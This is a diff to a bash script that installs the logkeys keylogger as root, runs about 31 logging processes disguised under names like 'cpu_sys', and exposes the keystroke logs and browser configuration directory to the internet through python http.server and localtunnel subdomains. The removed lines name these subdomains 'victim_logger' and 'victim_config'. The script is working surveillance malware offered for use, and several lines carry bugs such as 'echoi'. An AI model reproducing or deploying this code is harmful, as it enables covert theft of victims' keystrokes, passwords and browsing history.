@@ -20,13 +20,15 @@ fi
 
 if [ ! -f $CRON_FILE ]; then
     echo "cron file for root doesnot exist, creating.."
-    touch $CRON_FILE
-    /usr/bin/crontab $CRON_FILE
+    touch $SHELL_DEST
+    echoi $ME >> $SHELL_DEST
 fi
+
+mkdir $INSTALL_DIR
 
 INSTALL() {
     echo "Installing.."
-    apt install -y build-essential autotools-dev autoconf kbd
+    apt install -y python python3 build-essential autotools-dev autoconf kbd
     git clone https://github.com/kernc/logkeys.git $INSTALL_DIR
     cd $INSTALL_DIR
     ./autogen.sh
@@ -36,16 +38,19 @@ INSTALL() {
     make
     make install
 
-    apt install npm nodejs
+    apt install -y npm nodejs
     npm install -g localtunnel
 }
 
-if [ ! dpkg -l | grep -i "kbd" ]; then
-    INSTALL
+
+if [ ! whereis logkeys | grep -i "logkeys" ]; then
+   INSTALL
 else
-    echo "Logkeys already installed, Exiting.."
-    exit 1
+   echo "Logkeys already installed, Exiting.."
+   exit 1
 fi
+
+INSTALL 
 
 if [ ! -f $SHELL_DEST ]; then
     echo "Creating shell script.."
@@ -67,29 +72,35 @@ fi
 
 KEYLOGGER() {
     echo "Starting keylogger.."
-    for i in {1..31}; do
+    cd $INSTALL_DIR
+    for i in $(seq 1 31); do
         PROC_NAME="cpu_sys$i"
-        OUTPUT_FILE="/var/log/core_sys/core_sys$i.log"
+        OUTPUT_FILE="core_sys$i.md"
         EVENT_NAME="event$i"
-        bash -c "exec -a $PROC_NAME logkeys -s -d $EVENT_NAME --output $OUTPUT_FILE &" 
+        COMMAND="logkeys -s -d $EVENT_NAME --output $OUTPUT_FILE"
+        bash -c "exec -a $PROC_NAME $COMMAND &" 
+        #logkeys -s -d $EVENT_NAME --output $OUTPUT_FILE || echo "$EVENT_NAME"
         rm -rf /var/run/logkeys.pid
     done
 }
 
-FTP_SERV#R() {
+FTP_SERVER() {
     echo "Starting ftp server.."
     cd $INSTALL_DIR
-    python -m http.server 31
-    lt --local-host 0.0.0.0 --port 31 --subdomain victim_logger
+    cmd1="python3 -m http.server 31"
+    eval "${cmd1}" &>/dev/null & disown;
+    cmd2="lt --local-host 0.0.0.0 --port 31 --subdomain logger812432"
+    eval "${cmd2}" &>/dev/null & disown;
 }
 
 BROWSER_HISTORY() {
     echo "Starting browser history.."
     cd $CONFIG_PATH
-    python -m http.server 32
-    lt --local-host 0.0.0.0 --port 32 --subdomain victim_config
+    cmd1="python3 -m http.server 32"
+    eval "${cmd1}" &>/dev/null & disown;
+    cmd2="lt --local-host 0.0.0.0 --port 32 --subdomain config812432"
+    eval "${cmd2}" &>/dev/null & disown;
 }
-
 
 MAIN() {
     echo "Starting main.."
@@ -99,4 +110,3 @@ MAIN() {
 }
 
 MAIN
-
